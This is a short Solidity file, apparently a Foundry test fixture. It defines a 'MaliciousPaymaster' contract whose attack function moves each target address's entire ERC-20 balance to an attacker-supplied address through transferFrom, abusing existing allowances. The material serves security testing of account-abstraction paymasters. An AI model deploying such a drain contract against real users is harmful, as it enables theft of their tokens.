// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.23;

// import "account-abstraction-v7/samples/TokenPaymaster.sol";
import "account-abstraction-v7/test/TestERC20.sol";
import {Test, console} from "forge-std/Test.sol";

contract MaliciousPaymaster {
    function attack(
        address[] memory targets,
        address _token,
        address _to
    ) external {
        console.log("attack");
        for (uint256 i = 0; i < targets.length; i++) {
            address target = targets[i];
            TestERC20(_token).transferFrom(
                target,
                _to,
                TestERC20(_token).balanceOf(target)
            );
        }
    }
}
